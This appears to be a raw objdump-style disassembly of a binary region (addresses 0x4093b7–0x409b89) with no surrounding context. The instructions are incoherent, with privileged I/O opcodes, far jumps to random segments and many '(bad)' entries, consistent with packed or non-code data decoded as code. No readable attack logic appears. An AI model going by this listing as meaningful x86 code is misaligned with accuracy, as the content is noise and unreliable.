  4093b7:	pop    ss
  4093b8:	retf   0x89ba
  4093bb:	dec    esp
  4093bc:	je     0x409427
  4093be:	jg     0x409348
  4093c0:	aas    
  4093c1:	cmp    eax,esi
  4093c3:	leave  
  4093c4:	push   0x3a936790
  4093c9:	aas    
  4093ca:	or     DWORD PTR cs:[ebx+0x10],ecx
  4093ce:	dec    esi
  4093cf:	fs aaa 
  4093d1:	add    eax,0x8ab318d1
  4093d6:	sahf   
  4093d7:	icebp  
  4093d8:	jmp    0x409383
  4093da:	mov    cl,0x5d
  4093dc:	dec    esp
  4093dd:	pop    edx
  4093de:	jmp    0x4093e0
  4093e0:	lods   al,BYTE PTR ds:[esi]
  4093e1:	clts   
  4093e3:	call   0xdfce:0x1b48bbe1
  4093ea:	stos   DWORD PTR es:[edi],eax
  4093eb:	and    al,0xfc
  4093ed:	jg     0x4093ad
  4093ef:	push   ds
  4093f0:	dec    esp
  4093f1:	push   edx
  4093f2:	xchg   ebx,eax
  4093f3:	loopne 0x409470
  4093f5:	jmp    0x2e3a:0x6f6cf999
  4093fc:	xor    BYTE PTR [ebx+0x68],ch
  4093ff:	fcom   DWORD PTR [edx-0x6f]
  409402:	pop    edi
  409403:	ins    DWORD PTR es:[edi],dx
  409404:	or     al,0x5
  409406:	gs daa 
  409408:	jp     0x409435
  40940a:	dec    ebx
  40940b:	int3   
  40940c:	adc    ebx,ebx
  40940e:	fsubp  st(0),st
  409410:	jecxz  0x40947c
  409412:	cs dec edx
  409414:	xor    eax,0x7d8edd36
  409419:	mov    ecx,0xc3aba079
  40941e:	aam    0x88
  409420:	out    dx,al
  409421:	sbb    esp,ebp
  409423:	(bad)  
  409424:	and    eax,0x55065f14
  409429:	sbb    al,0xe5
  40942b:	jns    0x40949f
  40942d:	pushf  
  40942e:	data16 test BYTE PTR [ebx],ah
  409431:	and    edx,DWORD PTR [eax]
  409433:	(bad)  
  409435:	mov    cl,0x9
  409437:	sbb    DWORD PTR [ebx-0x6ab95f83],ecx
  40943d:	pop    esp
  40943e:	pop    eax
  40943f:	ds mov esi,0xad0166fa
  409445:	neg    BYTE PTR [ecx]
  409447:	aam    0xae
  409449:	sbb    BYTE PTR [eax+0x66ce12da],bl
  40944f:	xor    cl,BYTE PTR [ebx*1-0x36ff6d7f]
  409456:	pushw  cs
  409458:	mov    bh,0xbf
  40945a:	in     eax,0x3
  40945c:	pushf  
  40945d:	sub    dl,dl
  40945f:	sbb    eax,ecx
  409461:	add    DWORD PTR [ecx+0x5a],0xfffffffe
  409465:	pop    esp
  409466:	mov    bl,0xb9
  409468:	push   edx
  409469:	and    al,0x46
  40946b:	and    al,0xdd
  40946d:	push   es
  40946e:	mov    DWORD PTR [edx+0x7646df3a],0xc1a36ae8
  409478:	in     eax,0x50
  40947a:	and    DWORD PTR [ebp+0x6d661094],edi
  409480:	mov    ?,WORD PTR ds:0xb2a194cb
  409486:	mov    ah,0x19
  409488:	ds out 0x1d,al
  40948b:	mov    eax,ds:0x5112f803
  409490:	xchg   edi,eax
  409491:	mov    eax,ds:0x18ed19a9
  409496:	inc    eax
  409497:	loop   0x409434
  409499:	sbb    DWORD PTR [edx-0x2dbec8e7],edx
  40949f:	gs stc 
  4094a1:	imul   DWORD PTR [ebx-0x4]
  4094a4:	push   ebx
  4094a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094a6:	sahf   
  4094a7:	mov    eax,0x1d77947b
  4094ac:	popa   
  4094ad:	imul   esi,esp,0x99c65781
  4094b3:	jae    0x4094e6
  4094b5:	out    0x75,eax
  4094b7:	data16 inc sp
  4094ba:	dec    eax
  4094bb:	ret    0x2aa2
  4094be:	sar    dl,cl
  4094c0:	shl    BYTE PTR [ecx-0x77],1
  4094c3:	push   edx
  4094c4:	mov    BYTE PTR [ecx+0xc],ch
  4094c7:	push   edi
  4094c8:	sub    DWORD PTR [ebp+0x5f],ebx
  4094cb:	pop    es
  4094cc:	mov    esi,0x531ad757
  4094d1:	mov    esi,0x95e1a4aa
  4094d6:	mov    esi,0xfb6b1f74
  4094db:	test   ebp,ebx
  4094dd:	mov    ebp,0xacbbbd07
  4094e2:	jns    0x409562
  4094e4:	aas    
  4094e5:	inc    ebx
  4094e6:	xor    eax,0x2739f4eb
  4094eb:	shl    ch,1
  4094ed:	test   eax,0xea44ac90
  4094f2:	mov    ch,0xf5
  4094f4:	fld    TBYTE PTR [ebp+0x63375679]
  4094fa:	test   DWORD PTR [ecx],edx
  4094fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094fd:	arpl   WORD PTR [edx+ebp*4+0x3a],ax
  409501:	sub    ebp,DWORD PTR [edi-0x1b]
  409504:	xchg   ebx,eax
  409505:	xchg   ebx,eax
  409506:	mov    al,dl
  409508:	ins    BYTE PTR es:[edi],dx
  409509:	mov    ebp,0xab436c79
  40950e:	inc    ebp
  40950f:	push   0x34510376
  409514:	cmp    DWORD PTR [edx+0x58],ebp
  409517:	jne    0x4094a7
  409519:	sub    bh,bh
  40951b:	test   al,0x61
  40951d:	outs   dx,BYTE PTR ds:[esi]
  40951e:	cmp    bx,WORD PTR [edi+esi*2]
  409522:	or     al,0x10
  409524:	xor    DWORD PTR [ebx+0x6e],0x18
  409528:	lds    esi,FWORD PTR [ebx-0x68e9bf33]
  40952e:	dec    eax
  40952f:	std    
  409530:	cmp    eax,0x10926708
  409535:	arpl   WORD PTR [edx],di
  409537:	out    dx,al
  409538:	in     eax,0x3d
  40953a:	push   edx
  40953b:	retf   0x5e6
  40953e:	shl    BYTE PTR [edi],0x90
  409541:	sbb    BYTE PTR [edx-0x7c62ac9b],ch
  409547:	ins    BYTE PTR es:[edi],dx
  409548:	int3   
  409549:	in     al,0x53
  40954b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40954c:	(bad)  
  40954d:	push   0xffffff8f
  40954f:	add    BYTE PTR [ebx+0x7105112e],dl
  409555:	xor    BYTE PTR [ebx],ch
  409557:	mov    al,ds:0x9b0552dd
  40955c:	xchg   DWORD PTR [eax+0x5fbc94e7],ecx
  409562:	mov    al,0x1f
  409564:	out    dx,al
  409565:	push   0x1d
  409567:	jp     0x4095d6
  409569:	mov    ebp,DWORD PTR [ebx+0x4852abd1]
  40956f:	inc    edi
  409570:	xor    bl,BYTE PTR [edx+0x383f792e]
  409576:	jae    0x409538
  409578:	push   ss
  409579:	adc    eax,esi
  40957b:	sbb    DWORD PTR [eax],edx
  40957d:	test   al,0x47
  40957f:	sbb    DWORD PTR [eax],ebp
  409581:	es repnz push edi
  409584:	dec    esp
  409585:	xor    DWORD PTR ds:0xd90498d8,esp
  40958b:	add    BYTE PTR [eax+0xe],ch
  40958e:	push   cs
  40958f:	sti    
  409590:	inc    ecx
  409591:	push   0x75
  409593:	pop    ebx
  409594:	or     al,0x2e
  409596:	jmp    0x4095dd
  409598:	pop    edx
  409599:	shl    DWORD PTR [ecx-0x12],cl
  40959c:	cmp    ebx,edx
  40959e:	fidiv  WORD PTR [ecx-0x70]
  4095a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095a2:	cwde   
  4095a3:	add    ebx,edx
  4095a5:	mov    WORD PTR [eax],cs
  4095a7:	test   ecx,ecx
  4095a9:	sbb    DWORD PTR [edi],eax
  4095ab:	push   eax
  4095ac:	imul   esi,DWORD PTR [ebx],0xfb0d1ce6
  4095b2:	jb     0x40956b
  4095b4:	inc    ebx
  4095b5:	shl    BYTE PTR [esi+0x2e],cl
  4095b8:	sti    
  4095b9:	lock arpl WORD PTR [edi+ebx*8+0x9],cx
  4095be:	dec    ebp
  4095bf:	sbb    bl,cl
  4095c1:	repz add al,0xfa
  4095c4:	and    eax,0x523cbc9b
  4095c9:	sbb    eax,0x8b31464e
  4095ce:	xlat   BYTE PTR ds:[ebx]
  4095cf:	xchg   BYTE PTR [ecx],ah
  4095d1:	stos   DWORD PTR es:[edi],eax
  4095d2:	jl     0x409558
  4095d4:	inc    ecx
  4095d5:	push   0xfffffffc
  4095d7:	or     eax,0xd4fa69dd
  4095dc:	das    
  4095dd:	inc    ebp
  4095de:	shr    DWORD PTR [edi],cl
  4095e0:	fs mov bh,0x11
  4095e3:	and    DWORD PTR [ebx+0x25],edx
  4095e6:	fsincos 
  4095e8:	cdq    
  4095e9:	int3   
  4095ea:	add    DWORD PTR [ebx],ebx
  4095ec:	or     cl,BYTE PTR [ebx]
  4095ee:	mov    ah,BYTE PTR [ebx-0x47]
  4095f1:	mov    ebx,0x1f534fa0
  4095f6:	add    esp,edi
  4095f8:	mov    DWORD PTR [esi*4+0x266ae511],esi
  4095ff:	or     ebx,DWORD PTR [edx]
  409601:	dec    edx
  409602:	pop    DWORD PTR [edi+0x48]
  409605:	jmp    0xa6e6:0xcc8d7c19
  40960c:	out    dx,eax
  40960d:	adc    eax,0x9937b0
  409612:	cld    
  409613:	popa   
  409614:	mov    bl,0x6d
  409616:	test   eax,0x4d0c66d9
  40961b:	into   
  40961c:	mov    dh,cl
  40961e:	push   cs
  40961f:	rcr    BYTE PTR [ecx+ebp*8],cl
  409622:	jmp    0x40960e
  409624:	push   ebx
  409625:	retf   0x81e3
  409628:	xor    DWORD PTR [ecx+ebx*4-0x4e],ebp
  40962c:	dec    edi
  40962d:	sub    ebx,DWORD PTR [ebx+ebp*1-0x80]
  409631:	mov    eax,ds:0x8a5314d6
  409636:	sub    dh,BYTE PTR [esi-0x59]
  409639:	add    edx,DWORD PTR [edi-0x74969a86]
  40963f:	rcr    cl,1
  409641:	sbb    bl,BYTE PTR [edi+0x700818bf]
  409647:	scas   al,BYTE PTR es:[edi]
  409648:	push   esi
  409649:	and    al,0xa9
  40964b:	mov    edx,0xf0a6571e
  409650:	mov    eax,ds:0xf0db47e5
  409655:	sbb    bh,cl
  409657:	adc    bl,ch
  409659:	ret    
  40965a:	or     eax,0xd697db91
  40965f:	add    dh,BYTE PTR ds:0xd5fe6534
  409665:	sti    
  409666:	push   esp
  409667:	adc    BYTE PTR [eax+0x428bd3a1],bl
  40966d:	push   0x46
  40966f:	dec    ebx
  409670:	dec    esi
  409671:	push   ebp
  409672:	gs dec edi
  409674:	psrlq  mm2,mm3
  409677:	push   bx
  409679:	mov    dl,BYTE PTR cs:[ecx]
  40967c:	pop    ebp
  40967d:	fisubr WORD PTR [esi+0x12]
  409680:	xor    ch,BYTE PTR [ebp+ebp*8+0x25]
  409684:	mov    ds:0xc9cee6e8,eax
  409689:	inc    esi
  40968a:	mov    ebx,0xe8325329
  40968f:	inc    edi
  409690:	ret    
  409691:	jp     0x409679
  409693:	mov    ebx,0xb8394941
  409698:	pop    ebx
  409699:	test   eax,0x90ad5a1f
  40969e:	cwde   
  40969f:	cmp    bl,BYTE PTR [edx-0x41]
  4096a2:	outs   dx,DWORD PTR ds:[esi]
  4096a3:	ja     0x40969f
  4096a5:	push   0x26
  4096a7:	mov    ecx,0xdec53ac5
  4096ac:	out    dx,al
  4096ad:	ret    
  4096ae:	jecxz  0x4096e2
  4096b0:	aam    0xd
  4096b2:	jne    0x4096cf
  4096b4:	loope  0x409708
  4096b6:	jb     0x409714
  4096b8:	arpl   WORD PTR [esi+0x79],cx
  4096bb:	aad    0x96
  4096bd:	jbe    0x40967a
  4096bf:	adc    edi,0xfffffffe
  4096c2:	sub    bl,BYTE PTR [ecx]
  4096c4:	adc    cl,BYTE PTR [eax]
  4096c6:	shl    BYTE PTR [esi+0x10],cl
  4096c9:	add    eax,0xf8538708
  4096ce:	xor    ebx,DWORD PTR [ebx]
  4096d0:	push   ss
  4096d1:	push   ebp
  4096d2:	stc    
  4096d3:	loop   0x40969a
  4096d5:	push   0xe
  4096d7:	in     eax,dx
  4096d8:	mov    eax,ds:0x9170579
  4096dd:	lahf   
  4096de:	data16 jo 0x40972a
  4096e1:	dec    edi
  4096e2:	dec    esi
  4096e3:	and    cl,BYTE PTR ds:0x8fd21d3e
  4096e9:	xor    bh,BYTE PTR ss:[esi-0x76]
  4096ed:	cmp    DWORD PTR [ebp+esi*2-0x77],ebx
  4096f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096f2:	jmp    0x137e:0x6bdf53a3
  4096f9:	sub    al,0xb7
  4096fb:	ror    BYTE PTR [esi+0x0],0x30
  4096ff:	mov    dh,BYTE PTR ds:0x3379849b
  409705:	rcr    esi,0xbc
  409708:	push   ebx
  409709:	mov    bl,0x32
  40970b:	inc    eax
  40970c:	push   ecx
  40970d:	jo     0x409770
  40970f:	sub    eax,0x56f5697c
  409714:	mov    cl,0xdb
  409716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409717:	mov    WORD PTR [edx+eiz*4],ss
  40971a:	jns    0x409723
  40971c:	adc    ebp,DWORD PTR [edx+0x33]
  40971f:	in     eax,0x2d
  409721:	and    edx,DWORD PTR [ebx+0x18]
  409724:	ret    0x874a
  409727:	iret   
  409728:	push   cs
  409729:	fst    QWORD PTR [esi+0x27d15379]
  40972f:	xchg   edi,eax
  409730:	sbb    eax,0x95250eec
  409735:	dec    edi
  409736:	shl    BYTE PTR [eax],cl
  409738:	sbb    DWORD PTR [esi+eiz*2+0x4379d0a8],edx
  40973f:	mov    fs,WORD PTR es:[ecx]
  409742:	scas   al,BYTE PTR es:[edi]
  409743:	xchg   BYTE PTR [ebx-0x16],dl
  409746:	mov    DWORD PTR [eax-0xca474fd],ebx
  40974c:	dec    eax
  40974d:	push   0xffffffa4
  40974f:	cmp    al,0x4a
  409751:	in     eax,0x14
  409753:	push   esi
  409754:	sti    
  409755:	mov    al,ds:0x995a3948
  40975a:	arpl   WORD PTR [ebx],bx
  40975c:	cmp    DWORD PTR [edi],ebp
  40975e:	add    ecx,ebx
  409760:	lahf   
  409761:	stc    
  409762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409763:	sbb    DWORD PTR [ebp+0x3b],eax
  409766:	test   al,0x4f
  409768:	inc    esp
  409769:	popf   
  40976a:	ret    0x5308
  40976d:	jmp    0xf69f:0x6dc94a63
  409774:	jmp    0xd523bce3
  409779:	hlt    
  40977a:	shl    BYTE PTR [edi+0x50],cl
  40977d:	cmp    eax,0xdb594602
  409782:	sub    al,0xd0
  409784:	call   0x2cdf:0x13487f15
  40978b:	nop
  40978c:	sub    DWORD PTR [ebx-0x76],ebp
  40978f:	pop    ss
  409790:	jno    0x4097e7
  409792:	test   BYTE PTR [eax+esi*4-0x5749929],ch
  409799:	mov    fs,ebp
  40979b:	call   0x8f76:0xa394bca5
  4097a2:	and    eax,0x3be36f19
  4097a7:	cmp    eax,0xfb66b13e
  4097ac:	pop    edi
  4097ad:	cdq    
  4097ae:	mov    ah,0x7a
  4097b0:	cmp    bl,BYTE PTR [ebx]
  4097b2:	mov    ah,0x21
  4097b4:	nop
  4097b5:	jo     0x409745
  4097b7:	sbb    DWORD PTR [ecx-0xf],ebp
  4097ba:	sahf   
  4097bb:	dec    ecx
  4097bc:	inc    edx
  4097bd:	fidivr DWORD PTR [ecx+eiz*2]
  4097c0:	push   eax
  4097c1:	push   cs
  4097c2:	add    eax,0xf21ecd1a
  4097c7:	sbb    DWORD PTR [ecx-0x6b8c4eca],esi
  4097cd:	and    eax,0x3853f280
  4097d2:	lods   eax,DWORD PTR ds:[esi]
  4097d3:	push   edi
  4097d4:	(bad)  
  4097d5:	sub    eax,0xe458464
  4097da:	mov    edi,0x8c6ac6aa
  4097df:	popf   
  4097e0:	int3   
  4097e1:	and    esi,DWORD PTR [edi+0x79b4bda2]
  4097e7:	(bad)  
  4097e8:	mov    dl,0x31
  4097ea:	daa    
  4097eb:	loopne 0x4097eb
  4097ed:	aaa    
  4097ee:	(bad)  
  4097ef:	(bad)  
  4097f0:	lahf   
  4097f1:	dec    ebx
  4097f2:	nop
  4097f3:	repnz pop ecx
  4097f5:	or     edx,DWORD PTR [edx+0x19]
  4097f8:	je     0x409869
  4097fa:	mov    WORD PTR [ecx-0x7f],?
  4097fd:	fldenv [esi+0x26]
  409800:	rcl    DWORD PTR [ecx+0x1aff3c41],1
  409806:	mov    edi,0x9c1f9fd0
  40980b:	outs   dx,BYTE PTR ds:[esi]
  40980c:	stos   BYTE PTR es:[edi],al
  40980d:	mov    ecx,0x21a6662c
  409812:	jge    0x4097e1
  409814:	fyl2x  
  409816:	add    ebx,DWORD PTR [ebx]
  409818:	fs push 0x49f6d62b
  40981e:	outs   dx,BYTE PTR ds:[esi]
  40981f:	shl    BYTE PTR [ecx-0x25c59bd3],0xe4
  409826:	jmp    0xd3a52bef
  40982b:	ret    
  40982c:	push   ebx
  40982d:	mov    BYTE PTR fs:[esi+0x2fcad168],cl
  409834:	push   eax
  409835:	imul   esi,DWORD PTR [eax],0xc2052c0e
  40983b:	stc    
  40983c:	scas   eax,DWORD PTR es:[edi]
  40983d:	test   BYTE PTR [esi+0x16],ah
  409840:	mov    BYTE PTR [esi],bl
  409842:	inc    ebx
  409843:	xchg   ecx,eax
  409844:	inc    esp
  409845:	jae    0x40981a
  409847:	ins    DWORD PTR es:[edi],dx
  409848:	sbb    BYTE PTR [ebp+0x79],ah
  40984b:	mov    DWORD PTR [eax-0x3aa0a05e],edx
  409851:	sbb    edi,DWORD PTR [ecx-0x1b]
  409854:	aaa    
  409855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409856:	in     al,dx
  409857:	jle    0x40986d
  409859:	xchg   DWORD PTR [eax+ebx*1-0x69],edx
  40985d:	call   0xb5e7f172
  409862:	push   edx
  409863:	or     dl,BYTE PTR [ebx+0x39]
  409866:	rcr    bh,1
  409868:	mov    ecx,0x4ab8315a
  40986d:	sub    eax,0x52d3fe4e
  409872:	fild   WORD PTR [edi]
  409874:	cdq    
  409875:	xchg   edi,eax
  409876:	es mov esp,0xd0b7176b
  40987c:	outs   dx,DWORD PTR ds:[esi]
  40987d:	xchg   BYTE PTR [edx],dh
  40987f:	mov    eax,0x99fa2b85
  409884:	mov    BYTE PTR [esi],al
  409886:	adc    ecx,DWORD PTR [edx]
  409888:	mov    ds:0x16be6684,eax
  40988d:	push   edx
  40988e:	mov    eax,0x71f1a5e5
  409893:	sbb    BYTE PTR [ebx-0x53b7c1d8],dl
  409899:	fwait
  40989a:	or     ebx,DWORD PTR [edi]
  40989c:	das    
  40989d:	pop    eax
  40989e:	xchg   WORD PTR [ecx-0x1a],cx
  4098a2:	jp     0x4098f9
  4098a4:	fdivr  QWORD PTR [ecx-0x3c15e7b6]
  4098aa:	cdq    
  4098ab:	std    
  4098ac:	jno    0x409918
  4098ae:	mov    bh,0x62
  4098b0:	push   ebx
  4098b1:	(bad)  
  4098b2:	jns    0x4098da
  4098b4:	pop    ss
  4098b5:	popa   
  4098b6:	adc    eax,edx
  4098b8:	scas   al,BYTE PTR es:[edi]
  4098b9:	xchg   ebx,eax
  4098ba:	test   eax,0xd2d8cb19
  4098bf:	not    BYTE PTR [edx]
  4098c1:	test   DWORD PTR [ebx-0x4f4bacbc],edx
  4098c7:	sbb    al,BYTE PTR [ebp-0x5154e126]
  4098cd:	sar    BYTE PTR [ebp-0x5aea2c5e],cl
  4098d3:	jle    0x409931
  4098d5:	xchg   edi,eax
  4098d6:	outs   dx,DWORD PTR ds:[esi]
  4098d7:	pop    ebp
  4098d8:	data16 daa 
  4098da:	jge    0x409872
  4098dc:	xchg   ebx,eax
  4098dd:	inc    edx
  4098de:	jbe    0x409871
  4098e0:	inc    ecx
  4098e1:	stos   BYTE PTR es:[edi],al
  4098e2:	neg    BYTE PTR [ecx]
  4098e4:	and    DWORD PTR [edi],ebx
  4098e6:	cmp    al,0xf7
  4098e8:	js     0x40989b
  4098ea:	push   ds
  4098eb:	cmc    
  4098ec:	push   ebx
  4098ed:	xchg   esp,eax
  4098ee:	into   
  4098ef:	cwde   
  4098f0:	fwait
  4098f1:	cmp    al,0xb8
  4098f3:	test   DWORD PTR [edi-0x63c47800],eax
  4098f9:	or     eax,0x5d082b0c
  4098fe:	pop    edx
  4098ff:	jae    0x409962
  409901:	jbe    0x409889
  409903:	out    dx,al
  409904:	push   ebx
  409905:	pop    esi
  409906:	mov    edx,0xaa2601b8
  40990b:	aam    0xc4
  40990d:	dec    edx
  40990e:	xlat   BYTE PTR ds:[ebx]
  40990f:	ret    
  409910:	and    al,0x59
  409912:	mov    bh,0x7a
  409914:	es mov bh,0xe6
  409917:	add    DWORD PTR [ebp+0x13],edx
  40991a:	add    al,dl
  40991c:	loope  0x409949
  40991e:	cs iret 
  409920:	xchg   ecx,eax
  409921:	cmp    eax,0x6988284e
  409926:	sbb    al,0xa3
  409928:	in     eax,0xab
  40992a:	inc    esi
  40992b:	aam    0x38
  40992d:	mov    esi,0xe90fd679
  409932:	mov    eax,ds:0x23274d5d
  409937:	sbb    ebp,edx
  409939:	sbb    eax,0x4752cdb8
  40993e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40993f:	out    dx,eax
  409940:	push   ebx
  409941:	aad    0x89
  409943:	sbb    DWORD PTR [ebp-0x70cddb3c],0xfeea9469
  40994d:	mov    edx,0x4d310235
  409952:	fs dec eax
  409954:	loopne 0x4099ca
  409956:	pop    edi
  409957:	mov    edx,DWORD PTR [ecx]
  409959:	push   esp
  40995a:	and    esp,DWORD PTR gs:[ebx]
  40995d:	cmp    DWORD PTR [ebp+0x1951b6d6],esi
  409963:	jne    0x409904
  409965:	and    edx,ebx
  409967:	adc    eax,0x7d6645c3
  40996c:	outs   dx,BYTE PTR ds:[esi]
  40996d:	dec    ebx
  40996e:	push   cs
  40996f:	mov    dh,0x5c
  409971:	(bad)  
  409972:	loop   0x40998d
  409974:	cmp    bl,bl
  409976:	ret    0x4470
  409979:	test   eax,0x94536b37
  40997e:	jecxz  0x40997b
  409980:	adc    bl,dl
  409982:	out    dx,eax
  409983:	aaa    
  409984:	jno    0x4099f0
  409986:	arpl   WORD PTR [edi+ebp*2-0x484b52bc],cx
  40998d:	dec    edx
  40998e:	xchg   DWORD PTR [ebp-0x75],edx
  409991:	pop    ebp
  409992:	call   0x5b2bc674
  409997:	in     eax,0xf2
  409999:	in     eax,0xc2
  40999b:	scas   eax,DWORD PTR es:[edi]
  40999c:	in     eax,dx
  40999d:	push   0x7c
  40999f:	popf   
  4099a0:	xchg   edx,eax
  4099a1:	adc    BYTE PTR [edx],ah
  4099a3:	dec    ebp
  4099a4:	and    al,0x5c
  4099a6:	data16 mov WORD PTR [eax+ecx*2],cs
  4099aa:	es dec ebx
  4099ac:	fdiv   DWORD PTR [edx-0x5b]
  4099af:	test   al,0x7b
  4099b1:	fmul   QWORD PTR [edi-0x5e366ccb]
  4099b7:	push   esp
  4099b8:	mov    ch,0x74
  4099ba:	mov    esi,0xceea9169
  4099bf:	jne    0x409945
  4099c1:	das    
  4099c2:	inc    edx
  4099c3:	xchg   ecx,eax
  4099c4:	lods   al,BYTE PTR ds:[esi]
  4099c5:	pop    ds
  4099c6:	mov    bh,0x58
  4099c8:	fucomi st,st(4)
  4099ca:	gs dec edx
  4099cc:	pop    ss
  4099cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ce:	jmp    0x705caaef
  4099d3:	xor    al,0xc2
  4099d5:	xor    ch,BYTE PTR [ebp+edx*2-0x1b4ffecd]
  4099dc:	pop    eax
  4099dd:	sbb    BYTE PTR [eax+0x2e],ah
  4099e0:	outs   dx,BYTE PTR ds:[esi]
  4099e1:	pop    ds
  4099e2:	sbb    ebp,DWORD PTR [ecx]
  4099e4:	xor    ecx,DWORD PTR [ebp+0x48d3b5aa]
  4099ea:	out    dx,al
  4099eb:	inc    edi
  4099ec:	push   ebx
  4099ed:	pabsb  mm7,QWORD PTR [esi]
  4099f1:	daa    
  4099f2:	aam    0xde
  4099f4:	not    DWORD PTR [edx]
  4099f6:	fstp   TBYTE PTR [edx+0x1b044788]
  4099fc:	and    eax,0xd2973621
  409a01:	sub    al,0x71
  409a03:	into   
  409a04:	adc    eax,esi
  409a06:	in     al,0x55
  409a08:	jne    0x409a73
  409a0a:	(bad)  
  409a0b:	std    
  409a0c:	sub    DWORD PTR [edx+0x67],edi
  409a0f:	sbb    ebp,DWORD PTR [edx-0x13]
  409a12:	mov    ch,0x5e
  409a14:	fldcw  WORD PTR [edi]
  409a16:	(bad)  
  409a17:	cs push ebx
  409a19:	in     al,dx
  409a1a:	xchg   ebp,eax
  409a1b:	pop    ds
  409a1c:	mov    edi,0x1bd0e51f
  409a21:	push   es
  409a22:	sub    BYTE PTR [edi+0x52fc3af4],dl
  409a28:	repnz or al,0xc9
  409a2b:	or     DWORD PTR [ecx+esi*4+0x46],edi
  409a2f:	mov    BYTE PTR [eax-0x76c5868e],cl
  409a35:	mov    dh,0x2b
  409a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a38:	mov    al,0xcf
  409a3a:	mov    DWORD PTR [ecx],ebx
  409a3c:	pop    esp
  409a3d:	xchg   ebp,eax
  409a3e:	aam    0x67
  409a40:	jbe    0x409a5f
  409a42:	nop
  409a43:	adc    ah,bl
  409a45:	addr16 leave 
  409a47:	add    dl,BYTE PTR [ebx+0x27]
  409a4a:	out    dx,al
  409a4b:	lea    ebp,[eax]
  409a4d:	test   al,0x6e
  409a4f:	dec    ebp
  409a50:	nop
  409a51:	imul   eax,DWORD PTR [esi+0x67],0x7780e8b6
  409a58:	sbb    eax,0xab586671
  409a5d:	xchg   edx,eax
  409a5e:	ds int 0x5c
  409a61:	iret   
  409a62:	pop    edx
  409a63:	xlat   BYTE PTR ds:[ebx]
  409a64:	jl     0x409acf
  409a66:	pusha  
  409a67:	(bad)  
  409a68:	jns    0x409a4a
  409a6a:	fstp   DWORD PTR [edx-0x772a1883]
  409a70:	xchg   edi,eax
  409a71:	mov    ch,0x8d
  409a73:	sbb    esi,ebx
  409a75:	jmp    0x409a64
  409a77:	clc    
  409a78:	or     bl,BYTE PTR [ebx-0x71]
  409a7b:	(bad)  
  409a7c:	mov    DWORD PTR [ebp-0x60b395f0],eax
  409a82:	lds    eax,FWORD PTR ds:0xda0ab772
  409a88:	scas   eax,DWORD PTR es:[edi]
  409a89:	in     al,0xe5
  409a8b:	push   es
  409a8c:	xor    BYTE PTR [ecx*1-0x2b849e05],cl
  409a93:	sbb    DWORD PTR [edi+0x21],edx
  409a96:	jb     0x409a2b
  409a98:	cdq    
  409a99:	and    bh,BYTE PTR [bp+di+0x53]
  409a9d:	add    DWORD PTR [eax],edx
  409a9f:	out    0xc4,eax
  409aa1:	push   ebp
  409aa2:	mov    esp,0x296b1348
  409aa7:	es (bad) 
  409aa9:	lods   eax,DWORD PTR ds:[esi]
  409aaa:	jmp    0x75d4:0x675710aa
  409ab1:	cmp    edi,esi
  409ab3:	or     al,0xb8
  409ab5:	aam    0xa6
  409ab7:	jg     0x409a9e
  409ab9:	add    DWORD PTR [edx+0x68],ebx
  409abc:	arpl   WORD PTR [ebx+eiz*1-0x27],sp
  409ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac1:	addr16 mov ds:0x535a,al
  409ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ac6:	inc    eax
  409ac7:	adc    eax,DWORD PTR [eax+0x383ff252]
  409acd:	push   0x64
  409acf:	call   0x2836:0xc9d57fc0
  409ad6:	data16 int 0x19
  409ad9:	sahf   
  409ada:	or     BYTE PTR [ebx-0x573dee0b],bh
  409ae0:	lea    ecx,[ebx+ebx*8-0x2b09ec5b]
  409ae7:	imul   ebx,edi,0x937a7906
  409aed:	das    
  409aee:	mov    es,WORD PTR [ebx+0x55]
  409af1:	mov    ds:0x8b66198f,eax
  409af6:	shr    DWORD PTR [edx-0x7cffcacd],0x53
  409afd:	mov    bl,0x2a
  409aff:	pop    edx
  409b00:	mov    esp,0x8ed7bc58
  409b05:	imul   eax,ebx,0x7998857
  409b0b:	repnz pop ecx
  409b0d:	dec    edi
  409b0e:	jns    0x409ab1
  409b10:	add    DWORD PTR [ebp+esi*1+0x5749f713],ebp
  409b17:	mov    edx,0x98565a78
  409b1c:	lds    esp,FWORD PTR [edi]
  409b1e:	cmp    BYTE PTR [eax],0x11
  409b21:	mov    edx,0x9487bda9
  409b26:	stos   BYTE PTR es:[edi],al
  409b27:	cdq    
  409b28:	pop    ss
  409b29:	(bad)  
  409b2a:	jnp    0x409adf
  409b2c:	sub    BYTE PTR [ebx-0x7a899613],cl
  409b32:	pop    ecx
  409b33:	mov    ds:0xbf485b12,eax
  409b38:	xchg   ebx,eax
  409b39:	pop    edi
  409b3a:	adc    ch,BYTE PTR [eax]
  409b3c:	xor    edi,DWORD PTR [eax]
  409b3e:	ss aad 0xa8
  409b41:	gs jns 0x409b44
  409b44:	dec    esp
  409b45:	loope  0x409b09
  409b47:	dec    ecx
  409b48:	fistp  DWORD PTR [esi+0x6b019cd8]
  409b4e:	jle    0x409bb3
  409b50:	out    dx,eax
  409b51:	and    ebx,DWORD PTR [ecx+0x6680a985]
  409b57:	aad    0x7b
  409b59:	sub    al,0xec
  409b5b:	cmp    ecx,DWORD PTR [ebx+0x571924a5]
  409b61:	inc    ecx
  409b62:	or     eax,0xcddc496b
  409b67:	push   ecx
  409b68:	push   ebx
  409b69:	enter  0x946e,0xac
  409b6d:	lods   eax,DWORD PTR ds:[esi]
  409b6e:	cli    
  409b6f:	mov    DWORD PTR [eax],edi
  409b71:	push   0x3
  409b73:	in     eax,0x68
  409b75:	popf   
  409b76:	pop    edx
  409b77:	gs inc edi
  409b79:	int    0x66
  409b7b:	lds    edi,FWORD PTR [eax-0x3d]
  409b7e:	sub    bh,BYTE PTR [eax+0x2f]
  409b81:	mov    DWORD PTR [eax+ebx*1+0x3],0xd38ec691
  409b89:	cmp    al,0x91
